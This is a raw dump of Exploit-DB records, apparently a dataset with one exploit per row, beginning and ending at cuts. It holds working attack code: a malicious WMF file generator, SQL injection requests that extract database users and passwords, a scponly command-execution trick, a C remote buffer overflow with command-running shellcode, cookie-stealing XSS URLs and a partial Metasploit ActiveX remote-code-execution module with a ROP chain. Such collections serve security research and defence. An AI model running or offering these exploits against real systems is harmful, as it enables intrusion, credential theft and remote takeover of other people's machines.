B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' f.write(poc) f.close()  print ""Done, 1 file generated on 'C:\\' ..."" print ""Open this file in IrfanView 4.28 and enjoy ;)""",irfanview,1
1346,"Microsoft Windows Metafile - 'mtNoObjects' Denial of Service (MS05-053) /*  * Author: Winny Thomas  *         Pune, INDIA  *  * The crafted metafile (WMF) from this code when viewed in explorer crashes it. The issue is seen  * when the field 'mtNoObjects' in the Metafile header is set to 0x0000.  * The code was tested on Windows 2000 server SP4. The issue does not occur with the    * hotfix for GDI (MS05-053) installed.  *  * Disclaimer: This code is for educational/testing purposes by authorized persons on   * networks/systems setup for such a purpose. The author of this code shall not bear   * any responsibility for any damage caused by using this code.   *  */  #include <stdio.h>  unsigned char wmfheader[] =  ""\xd7\xcd\xc6\x9a\x00\x00\xc6\xfb\xca\x02\xaa\x02\x39\x09\xe8\x03"" ""\x00\x00\x00\x00\x66\xa6"" ""\x01\x00""	   //mtType	 ""\x09\x00""	   //mtHeaderSize ""\x00\x03""	   //mtVersion ""\xff\xff\xff\x7f"" //mtSize ""\x00\x00""	   //mtNoObjects  ""\xff\xff\xff\xff"" //mtMaxRecord ""\x00\x00"";  unsigned char metafileRECORD[] =  ""\x05\x00\x00\x00\x0b\x02\x39\x09\xc6\xfb\x05\x00\x00\x00\x0c\x02"" ""\x91\xf9\xe4\x06\x04\x00\x00\x00\x06\x01\x01\x00\x07\x00\x00\x00"" ""\xfc\x02\x00\x00\x0e\x0d\x0d\x00\x00\x00\x04\x00\x00\x00\x2d\x01"" ""\x00\x00\x08\x00\x00\x00\xfa\x02"" ""\x05\x00\x00\x00\x00\x00\xff\xff\xff\x00\x04\x00\x00\x00\x2d\x01"" ""\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03"" ""\x08\x00\xc6\xfb\xca\x02\xbc\xfe\xca\x02\x0f\x01\x49\x06\xa5\x02"" ""\x49\x06\xf4\x00\x68\x08\xd5\xfc\x65\x06\x86\xfe\x65\x06\xc6\xfb"" ""\xca\x02\x08\x00\x00\x00\xfa\x02\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x04\x00\x00\x00\x2d\x01\x02\x00\x07\x00\x00\x00\xfc\x02"" ""\x00\x00\xff\xff\xff\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x03\x00"" ""\x04\x00\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00"" ""\xbd\x34\x30\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00"" ""\x00\x00\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00"" ""\x00\x00\x24\x03\x05\x00\xd5\xfc\x36\x07\xda\xfc\xd1\x06\x8b\xfe"" ""\xd1\x06\x86\xfe\x36\x07\xd5\xfc\x36\x07\x04\x00\x00\x00\x2d\x01"" ""\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01"" ""\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xbd\x34\x30\x00\x00\x00"" ""\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00"" ""\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00\x00\x00\x24\x03\x05\x00"" ""\xc6\xfb\x9b\x03\xcb\xfb\x36\x03\xc1\xfe\x36\x03\xbc\xfe\x9b\x03"" ""\xc6\xfb\x9b\x03\x04\x00\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00"" ""\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00"" ""\xfc\x02\x00\x00\xfb\x4e\x55\x00\x00\x00\x04\x00\x00\x00\x2d\x01"" ""\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01"" ""\x01\x00\x0e\x00\x00\x00\x24\x03\x05\x00\xbc\xfe\x9b\x03\xc1\xfe"" ""\x36\x03\x14\x01\xb5\x06\x0f\x01\x1a\x07\xbc\xfe\x9b\x03\x04\x00"" ""\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00"" ""\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xbd\x34"" ""\x30\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00"" ""\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00\x00\x00"" ""\x24\x03\x05\x00\x0f\x01\x1a\x07\x14\x01\xb5\x06\xaa\x02\xb5\x06"" ""\xa5\x02\x1a\x07\x0f\x01\x1a\x07\x04\x00\x00\x00\x2d\x01\x02\x00"" ""\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00"" ""\x07\x00\x00\x00\xfc\x02\x00\x00\xfa\x94\x93\x00\x00\x00\x04\x00"" ""\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00"" ""\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03\x08\x00\xc6\xfb"" ""\x9b\x03\xbc\xfe\x9b\x03\x0f\x01\x1a\x07\xa5\x02\x1a\x07\xf4\x00"" ""\x39\x09\xd5\xfc\x36\x07\x86\xfe\x36\x07\xc6\xfb\x9b\x03\x04\x00"" ""\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00"" ""\x00\x00\xf0\x01\x00\x00\x03\x00"";  unsigned char wmfeof[] =  ""\x00\x00\x00\x00"";  int main(int argc, char *argv[]) { 	FILE *fp; 	int metafilesizeW, recordsizeW; 	char wmfbuf[2048]; 	int metafilesize, recordsize, i, j; 	 	metafilesize = sizeof (wmfheader) + sizeof (metafileRECORD) + sizeof(wmfeof) -3; 	metafilesizeW = metafilesize/2; 	recordsize = sizeof (metafileRECORD) -1; 	recordsizeW = recordsize/2; 	 	memcpy((unsigned long *)&wmfheader[28], &metafilesize, 4); 	memcpy((unsigned long *)&wmfheader[34], &recordsizeW, 4);  	printf(""[*] Adding Metafile header\n""); 	for (i = 0; i < sizeof(wmfheader) -1; i++) { 		(unsigned char)wmfbuf[i] = (unsigned char)wmfheader[i]; 	} 			 	printf(""[*] Adding metafile records\n""); 	for (j = i, i = 0; i < sizeof(metafileRECORD) -1; i++, j++) { 		wmfbuf[j] = metafileRECORD[i]; 	} 	 	printf(""[*] Setting EOF\n""); 	for (i = 0; i < sizeof(wmfeof) -1; i++, j++) { 		wmfbuf[j] = wmfeof[i]; 	}  	printf(""[*] Creating Metafile (MS053.wmf)\n""); 	fp = fopen(""MS053.wmf"", ""wb""); 	fwrite(wmfbuf, 1, metafilesize, fp); 	fclose(fp); }  // milw0rm.com [2005-11-30]",Microsoft,1
46151,"Real Estate Custom Script 2.0 - SQL Injection # Exploit Title: Real Estate Custom Script 2.0 - SQL Injection # Dork: N/A # Date: 2019-01-14 # Exploit Author: Ihsan Sencan # Vendor Homepage: http://ocsolutions.co.in/ # Software Link: https://codecanyon.net/item/real-estate-custom-script/21268075 # Version: 2.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/index.php?route=property/property_detail&property_id=[SQL] #   GET /[PATH]/index.php?route=property/property_detail&property_id=15912%27||(SeleCT%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(SeLEct%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20INFOrmatION_SchEMA.PluGINS%20grOUp%20BY%20x)a))||%27%6e%28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%58 HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=b22e9305c86adea2c071bf2d1053725c; default=78b0c7c7490c09d10765fb78b61bd9a3; language=en-gb; currency=USD; __zlcmid=qMhwOYHc5w0Pnj DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Date: Mon, 14 Jan 2019 11:20:04 GMT Server: Apache/2.2.34 (Unix) mod_ssl/2.2.34 OpenSSL/1.0.1e-fips DAV/2 mod_bwlimited/1.4 mod_fcgid/2.3.9 X-Powered-By: PHP/5.6.31 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: default=78b0c7c7490c09d10765fb78b61bd9a3; path=/; httponly Keep-Alive: timeout=5, max=98 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8  # POC:  # 2) # http://localhost/[PATH]/index.php?route=property/category&filter_area=[SQL] #   GET /[PATH]/index.php?route=property/category&filter_area=1;265112%27||(%53%65%6c%65%43%54%20%27Efe%27%20FroM%20duAL%20WheRE%20%31%31%30%3d%31%31%30%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(%53%65%4c%45%63%74%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20%49%4e%46%4f%72%6d%61%74%49%4f%4e%5f%53%63%68%45%4d%41%2e%50%6c%75%47%49%4e%53%20grOUp%20BY%20x)a))||%27%6e%28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%58 HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=b22e9305c86adea2c071bf2d1053725c; default=78b0c7c7490c09d10765fb78b61bd9a3; language=en-gb; currency=USD; __zlcmid=qMhwOYHc5w0Pnj DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Date: Mon, 14 Jan 2019 11:23:45 GMT Server: Apache/2.2.34 (Unix) mod_ssl/2.2.34 OpenSSL/1.0.1e-fips DAV/2 mod_bwlimited/1.4 mod_fcgid/2.3.9 X-Powered-By: PHP/5.6.31 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: default=78b0c7c7490c09d10765fb78b61bd9a3; path=/; httponly Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8  # POC:  # 3) # http://localhost/[PATH]/index.php?route=property/category%20&filter_range=[SQL] #   GET /[PATH]/index.php?route=property/category%20&filter_range=1;8200012%27||(%53%65%6c%65%43%54%20%27Efe%27%20FroM%20duAL%20WheRE%20%31%31%30%3d%31%31%30%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),ConCAT(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(%53%65%4c%45%63%74%20(ELT(112=112,1))),FLooR(RAnd(0)*2))x%20FROM%20%49%4e%46%4f%72%6d%61%74%49%4f%4e%5f%53%63%68%45%4d%41%2e%50%6c%75%47%49%4e%53%20grOUp%20BY%20x)a))||%27%6e%28%29%2c%28%53%45%4c%45%43%54%20%28%45%4c%54%28%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29%29%29%2d%2d%20%58 HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=b22e9305c86adea2c071bf2d1053725c; default=78b0c7c7490c09d10765fb78b61bd9a3; language=en-gb; currency=USD; __zlcmid=qMhwOYHc5w0Pnj DNT: 1 Connection: keep-alive Upgrade-Insecure-Requests: 1 HTTP/1.1 200 OK Date: Mon, 14 Jan 2019 11:24:49 GMT Server: Apache/2.2.34 (Unix) mod_ssl/2.2.34 OpenSSL/1.0.1e-fips DAV/2 mod_bwlimited/1.4 mod_fcgid/2.3.9 X-Powered-By: PHP/5.6.31 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: default=78b0c7c7490c09d10765fb78b61bd9a3; path=/; httponly Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8",Real,1
24794,"SCPOnly 2.x/3.x - Arbitrary Command Execution source: https://www.securityfocus.com/bid/11791/info  scponly is reported prone to a remote arbitrary command execution vulnerability. This issue may allow a remote attacker to execute commands and scripts on a vulnerable computer and eventually allow an attacker to gain elevated privileges on a vulnerable computer.  Versions prior to 4.0 are reported susceptible to this issue.  ssh restricteduser@remotehost 'rsync -e ""touch /tmp/example --"" localhost:/dev/null /tmp'  scp command.sh restricteduser@remotehost:/tmp/command.sh  ssh restricteduser@remotehost 'scp -S /tmp/command.sh localhost:/dev/null /tmp'",SCPOnly,1
19622,"Antelope Software W4-Server 2.6 a/Win32 - 'Cgitest.exe' Remote Buffer Overflow // source: https://www.securityfocus.com/bid/802/info  Certain versions of the W4-Server 32-bits personal webserver by Antelope Software ship with a flawed script, Cgitest.exe. This compiled CGI script fails to perform bounds checking on user supplied data and is vulnerable to a buffer overflow.   /*=============================================================================    Cgitest.exe Exploit (Distributed with W4-Server2.6a/32-bits)    The Shadow Penguin Security (http://shadowpenguin.backsection.net)    Written by UNYUN (shadowpenguin@backsection.net)   ============================================================================= */  #include    <stdio.h> #include    <string.h> #include    <windows.h>  #include    <winsock.h>  #define     HTTP_PORT       80 #define     MAXBUF          2600 #define     RETADR          264 #define     FAKEADR         256 #define     JMPESP_1        0xff #define     JMPESP_2        0xe4 #define     KERNEL_NAME     ""kernel32.dll""        unsigned char exploit_code[200]={ 0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3, 0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7, 0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53, 0x52,0x32,0xE4,0x83,0xC3,0x06,0x88,0x23, 0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B, 0xF0,0x5A,0x43,0x53,0x52,0x32,0xE4,0x83, 0xC3,0x04,0x88,0x23,0xB8,0x28,0x6E,0xF7, 0xBF,0xFF,0xD0,0x8B,0xF8,0x43,0x53,0x83, 0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6, 0x33,0xC0,0x50,0xFF,0xD7,0xE8,0xB0,0xFF, 0xFF,0xFF,0x00}; unsigned char cmdbuf[200]=""msvcrt.dll.system.exit."";   unsigned int search_mem(unsigned char *st,unsigned char *ed,                 unsigned char c1,unsigned char c2) {     unsigned char   *p;     unsigned int    adr;      for (p=st;p<ed;p++)         if (*p==c1 && *(p+1)==c2){             adr=(unsigned int)p;             if ((adr&0xff)==0) continue;             if (((adr>>8)&0xff)==0) continue;             if (((adr>>16)&0xff)==0) continue;             if (((adr>>24)&0xff)==0) continue;             return(adr);         }     return(0); }  main(int argc,char *argv[]) {     SOCKET               sock;     SOCKADDR_IN          addr;     WSADATA              wsa;     WORD                 wVersionRequested;     unsigned int         i,kp,ip,p1,p2,p;     unsigned int         pfakeadr,pretadr;     static unsigned char buf[MAXBUF],packetbuf[MAXBUF+1000],*q;     struct hostent       *hs;     MEMORY_BASIC_INFORMATION meminfo;      if (argc<2){         printf(""usage: %s VictimHost Command\n"",argv[0]);         exit(1);     }     if ((void *)(kp=(unsigned int)LoadLibrary(KERNEL_NAME))==NULL){         printf(""Can not find %s\n"",KERNEL_NAME);         exit(1);     }      strcat(cmdbuf,argv[2]);      VirtualQuery((void *)kp,&meminfo,sizeof(MEMORY_BASIC_INFORMATION));      pfakeadr=pretadr=0;     for (i=0;i<meminfo.RegionSize;i++){         p=kp+i;         if ( ( p     &0xff)==0           || ((p>>8 )&0xff)==0           || ((p>>16)&0xff)==0           || ((p>>24)&0xff)==0) continue;         q=(unsigned char *)p;         if (pfakeadr==0 && *q%2==0) pfakeadr=p+4;         if (pretadr==0  && *q==JMPESP_1 && *(q+1)==JMPESP_2) pretadr=p;         if (pfakeadr!=0 && pretadr!=0) break;     }     printf(""FAKEADR : %x\n"",pfakeadr);     printf(""RETADR  : %x\n"",pretadr);     if (pfakeadr==0 || pretadr==0){         printf(""Can not find codes which are used by exploit.\n"");         exit(1);     }      wVersionRequested = MAKEWORD( 2, 0 );     if (WSAStartup(wVersionRequested , &wsa)!=0){         printf(""Winsock Initialization failed.\n""); return -1;     }     if ((sock=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){         printf(""Can not create socket.\n""); return -1;     }     addr.sin_family     = AF_INET;     addr.sin_port       = htons((u_short)HTTP_PORT);     if ((addr.sin_addr.s_addr=inet_addr(argv[1]))==-1){             if ((hs=gethostbyname(argv[1]))==NULL){                 printf(""Can not resolve specified host.\n""); return -1;             }             addr.sin_family = hs->h_addrtype;             memcpy((void *)&addr.sin_addr.s_addr,hs->h_addr,hs->h_length);     }     if (connect(sock,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){         printf(""Can not connect to specified host.\n""); return -1;     }     memset(buf,0x90,MAXBUF); buf[MAXBUF]=0;      ip=pfakeadr;     buf[FAKEADR  ]=ip&0xff;     buf[FAKEADR+1]=(ip>>8)&0xff;     buf[FAKEADR+2]=(ip>>16)&0xff;     buf[FAKEADR+3]=(ip>>24)&0xff;          ip=pretadr;     buf[RETADR  ]=ip&0xff;     buf[RETADR+1]=(ip>>8)&0xff;     buf[RETADR+2]=(ip>>16)&0xff;     buf[RETADR+3]=(ip>>24)&0xff;      strcat(exploit_code,cmdbuf);     p1=(unsigned int)LoadLibrary;     p2=(unsigned int)GetProcAddress;      exploit_code[0x0d]=p1&0xff;     exploit_code[0x0e]=(p1>>8)&0xff;     exploit_code[0x0f]=(p1>>16)&0xff;     exploit_code[0x10]=(p1>>24)&0xff;      exploit_code[0x21]=exploit_code[0x35]=p2&0xff;     exploit_code[0x22]=exploit_code[0x36]=(p2>>8)&0xff;     exploit_code[0x23]=exploit_code[0x37]=(p2>>16)&0xff;     exploit_code[0x24]=exploit_code[0x38]=(p2>>24)&0xff;      exploit_code[0x41]=strlen(argv[2]);     memcpy(buf+RETADR+4,exploit_code,strlen(exploit_code));          sprintf(packetbuf,""GET /cgi-bin/cgitest.exe\r\n"");     send(sock,packetbuf,strlen(packetbuf),0);     sprintf(packetbuf,""User-Agent: %s\r\n\r\n"",buf);     send(sock,packetbuf,strlen(packetbuf),0);     closesocket(sock);     printf(""Done.\n"");     return FALSE; }",Antelope,1
21488,"Netscape Enterprise Web Server for Netware 4/5 5.0 - Information Disclosure source: https://www.securityfocus.com/bid/4874/info  It has been reported that Netscape Enterprise Web Server may disclose path and system information to a remote user.  Netscape Enterprise Web Server for Netware contain several sample files which leak system information, this information can be obtained by remote users.  An attacker is able to send a request, for an affected sample file, that will cause the host to disclose the location of the web root path. Certain sample files will also reveal detailed system specific information.   http://webserver/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/misc/test.jse  http://webserver/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/misc/allfield.jse  http://webserver/perl/samples/env.pl  http://webserver/perl/samples/lancgi.pl  http://webserver/perl/samples/volscgi.pl  http://webserver/perl/samples/ndslogin.pl  http://webserver/netbasic/websinfo.bas",Netscape,1
37789,"OpenFiler 2.3 - Multiple Cross-Site Scripting / Information Disclosure Vulnerabilities source: https://www.securityfocus.com/bid/55500/info  Openfiler is prone to multiple cross-site scripting and information disclosure vulnerabilities.  An attacker may leverage these issues to obtain potentially sensitive information and to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Openfiler versions 2.3, 2.99.1 and 2.99.2 are vulnerable; other versions may also be affected.   https://www.example.com/admin/system.html?step=2&device=""><script>alert(document.cookie);</script><p+""  https://www.example.com/admin/volumes_iscsi_targets.html?targetName=""><script>alert(document.cookie);</script><p+""  https://www.example.com/phpinfo.html  https://www.example.com/uptime.html",openfiler,1
12634,"PHP Gamepage - SQL Injection *************************************************************************  ,                                 |       ,---. ,   . |---. ,---. ,---.   ,---. ,---. ,---. ,   .   ,  |  ---  |     |   | |   | |---' |       |     |     |---' |   |   |  |       `---' `---| `---' `---' `       `---' `     `---' `---`---  `             `---'                                                    ************************************************************************* [V] PHP Gamepage SQL Injection Vulnerability  			--==[ Author ]==-- [+] Author	: v4lc0m87 [+] Contact	: valcom87[at]gmail[dot]com [+] Group	: INDONESIAN CYBER [+] Site	: http://indonesian-cyber.org/ [+] Date	: May, 17-2010 [INDONESIA]  ************************************************************************* 			--==[ Details ]==--  [+] Vulnerable	: SQL Injection [+] Google Dork	: inurl:index.php?title=gamepage  +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  [-] Exploit: [+] -111+union+select+0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat_ws(0x3a,id,login,pass)v4lc0m87,0,0,0,0,0,0,0,0,0,0,0,0+from+cw2_user--  [-] Remote SQLi p0c: [+] http://127.0.0.1/index.php?title=gamepage&m=-111+union+select+0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat_ws(0x3a,id,login,pass)v4lc0m87,0,0,0,0,0,0,0,0,0,0,0,0+from+cw2_user--       +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  INDONESIAN-CYBER.ORG | DEVILZC0DE.ORG | INDONESIANHACKER.ORG | HACKER-CISADANE.ORG | TECON-CREW.ORG  [V] thx to: SaruKusai (putus nyambung terus,hahha) MarilynMesum (smoga jadi bassis terbaik) Team m0n0n banci kamera(clase_1214n,c4uR,astroboyyy,aldy182,vhesckot_1601) Bocah tua nakal (mbah l4mpor,awchoy) flyff666 cruz3N petimati spykit v3n0m uzanc kokoh wisdom (program jadi rokok 3 slop marlboro menthol wkwkwkwk) blue screen, skutengboy (kalian pasangan yg serasi, jikakakakakk) [K]urabu[S]aru [RnR] cO2 community and y0u !!",PHP,1
28724,"SIEMENS Solid Edge ST4 SEListCtrlX - ActiveX Remote Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::HttpServer::HTML   include Msf::Exploit::RopDb   include Msf::Exploit::Remote::BrowserAutopwn    autopwn_info({     :ua_name    => HttpClients::IE,     :ua_minver  => ""6.0"",     :ua_maxver  => ""9.0"",     :javascript => true,     :os_name    => OperatingSystems::WINDOWS,     :rank       => Rank,     :classid    => ""{5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D}""   })    def initialize(info={})     super(update_info(info,       'Name'           => ""SIEMENS Solid Edge ST4 SEListCtrlX ActiveX Remote Code Execution"",       'Description'    => %q{         This module exploits the SEListCtrlX ActiveX installed with the SIEMENS Solid Edge product.         The vulnerability exists on several APIs provided by the control, where user supplied input         is handled as a memory pointer without proper validation, allowing an attacker to read and         corrupt memory from the target process. This module abuses the methods NumChildren() and         DeleteItem() in order to achieve memory info leak and remote code execution respectively.         This module has been tested successfully on IE6-IE9 on Windows XP SP3 and Windows 7 SP1,         using Solid Edge 10.4.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'rgod <rgod[at]autistici.org>', # Vulnerability discovery and PoC           'juan vazquez' # Metasploit module         ],       'References'     =>         [           [ 'OSVDB', '93696' ],           [ 'EDB', '25712' ],           [ 'URL', 'http://retrogod.altervista.org/9sg_siemens_adv_ii.htm' ]         ],       'Payload'        =>         {           'Space' => 906,           'DisableNops' => true,           'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"" # Stack adjustment # add esp, -3500         },       'DefaultOptions'  =>         {           'InitialAutoRunScript' => 'migrate -f'         },       'Platform'       => 'win',       'Targets'        =>         [           # Jutil.dll 104.0.0.82           # SEListCtrlX 104.0.0.82           [ 'Automatic', {} ],           [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],           [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],           [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4' } ],           [ 'IE 7 on Windows Vista',  { 'Rop' => nil,  'Offset' => '0x5f4' } ],           [ 'IE 8 on Windows Vista',  { 'Rop' => :jutil, 'Offset' => '0x5f4' } ],           [ 'IE 8 on Windows 7',      { 'Rop' => :jutil, 'Offset' => '0x5f4' } ],           [ 'IE 9 on Windows 7',      { 'Rop' => :jutil, 'Offset' => '0x5fe' } ]         ],       'Privileged'     => false,       'DisclosureDate' => ""May 26 2013"",       'DefaultTarget'  => 0))      register_options(       [         OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])       ], self.class)    end    def junk     return rand_text_alpha(4).unpack(""V"").first   end    def get_target(agent)     #If the user is already specified by the user, we'll just use that     return target if target.name != 'Automatic'      nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''     ie = agent.scan(/MSIE (\d)/).flatten[0] || ''      ie_name = ""IE #{ie}""      case nt     when '5.1'       os_name = 'Windows XP SP3'     when '6.0'       os_name = 'Windows Vista'     when '6.1'       os_name = 'Windows 7'     end      targets.each do |t|       if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))         print_status(""Target selected as: #{t.name}"")         return t       end     end      return nil   end    # JUtil ROP Chain   # Jutil Base: 0x1d550000   # Stack Pivot: jutil_base + 0x000a5843 # xchg eax, esp # ret   # Adjust Stack: jutil_base + 0x00212f17 # pop # pop # ret   # 0x1db2e121, # POP EDX # RETN [JUtil.dll]   # 0x1d5520ca, # ptr to &VirtualProtect() [IAT JUtil.dll]   # 0x1da0ebeb, # MOV EDX,DWORD PTR DS:[EDX] # RETN [JUtil.dll]   # 0x1da103d2, # MOV ESI,EDX # RETN [JUtil.dll]   # 0x1d70e314, # POP EBP # RETN [JUtil.dll]   # 0x1d5fc8e8, # & jmp esp [JUtil.dll]   # 0x1d631859, # POP EBX # RETN [JUtil.dll]   # 0x00000201, # 0x00000201-> ebx   # 0x1d769cf9, # POP EDX # RETN [JUtil.dll]   # 0x00000040, # 0x00000040-> edx   # 0x1d6d2e50, # POP ECX # RETN [JUtil.dll]   # 0x1da45217, # &Writable location [JUtil.dll]   # 0x1d632fd1, # POP EDI # RETN [JUtil.dll]   # 0x1d6839db, # RETN (ROP NOP) [JUtil.dll]   # 0x1d752439, # POP EAX # RETN [JUtil.dll]   # 0x90909090, # nop   # 0x1da4cfe3, # PUSHAD # RETN [JUtil.dll]   def ie9_spray(t, p)     js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))     js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(t.arch))      js = %Q|      function rop_chain(jutil_base){       var arr = [         Number(Math.floor(Math.random()*0xffffffff)),         Number(0x0c0c0c0c),         Number(0x0c0c0c0c),         Number(0x0c0c0c1c),         Number(0x0c0c0c24),         Number(0x0c0c0c28),         Number(Math.floor(Math.random()*0xffffffff)),         Number(Math.floor(Math.random()*0xffffffff)),         Number(0x0c0c0c0c),         Number(0x0c0c0c3c),         jutil_base + Number(0x00212f17),         jutil_base + Number(0x000a5843),         Number(0x0c0c0c34),         jutil_base + Number(0x5de121),         jutil_base + Number(0x20ca),         jutil_base + Number(0x4bebeb),         jutil_base + Number(0x4c03d2),         jutil_base + Number(0x1be314),         jutil_base + Number(0xac8e8),         jutil_base + Number(0xe1859),         Number(0x00000201),         jutil_base + Number(0x219cf9),         Number(0x00000040),         jutil_base + Number(0x182e50),         jutil_base + Number(0x4f5217),         jutil_base + Number(0xe2fd1),         jutil_base + Number(0x1339db),         jutil_base + Number(0x202439),         Number(0x90909090),         jutil_base + Number(0x4fcfe3)       ];       return arr;     }      function d2u(dword){       var uni = String.fromCharCode(dword & 0xFFFF);       uni += String.fromCharCode(dword>>16);       return uni;     }      function tab2uni(tab){       var uni = """"       for(var i=0;i<tab.length;i++){         uni += d2u(tab[i]);       }       return uni;     }      function randomblock(blocksize)     {       var theblock = """";       for (var i = 0; i < blocksize; i++)       {         theblock += Math.floor(Math.random()*90)+10;       }       return theblock;     }      function tounescape(block)     {       var blocklen = block.length;       var unescapestr = """";       for 